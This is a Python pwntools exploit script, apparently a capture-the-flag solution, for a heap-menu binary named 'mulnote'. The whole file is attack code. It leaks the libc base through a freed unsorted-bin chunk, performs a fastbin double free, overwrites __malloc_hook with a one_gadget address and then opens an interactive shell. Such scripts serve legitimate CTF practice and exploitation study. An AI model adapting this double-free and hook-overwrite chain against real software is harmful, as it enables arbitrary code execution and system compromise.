from pwn import *
p = process('./mulnote', env = {'LD_PRELOAD':'./libc.so'})
e = ELF('./mulnote')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget = 0x4526a

def cmd(command):
    p.recvuntil(b">")
    p.sendline(command)

def new(size:int, content):
    cmd(b'C')
    p.recvuntil(b"size>")
    p.sendline(str(size).encode())
    p.recvuntil(b"note>")
    p.sendline(content)

def edit(index:int, content):
    cmd(b'E')
    p.recvuntil(b"index>")
    p.sendline(str(index).encode())
    p.recvuntil(b"new note>")
    p.sendline(content)

def free(index:int):
    cmd(b'R')
    p.recvuntil(b"index>")
    p.sendline(str(index).encode())

def show():
    cmd(b'S')

def exp():
    # initialize
    new(0x60, b'arttnba3') # idx 0
    new(0x60, b'arttnba3') # idx 1
    new(0x80, b'arttnba3') # idx 2
    new(0x10, b'arttnba3') # idx 3

    # leak the libc
    free(2)
    show()
    main_arena = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 88
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base: ' + hex(libc_base))

    # fastbin double free
    free(0)
    free(1)
    free(0)

    # fastbin attack
    new(0x60, p64(libc_base + libc.sym['__malloc_hook'] - 0x23)) # idx 0
    new(0x60, b'arttnba3') # idx 1
    new(0x60, b'arttnba3') # idx 2, overlapping chunk with idx 0
    new(0x60, b'A' * 0x13 + p64(libc_base + one_gadget))

    # get the shell
    cmd(b'C')
    p.recvuntil(b"size>")
    p.sendline(str(0x10).encode())
    p.interactive()


if __name__ == '__main__':
    exp()
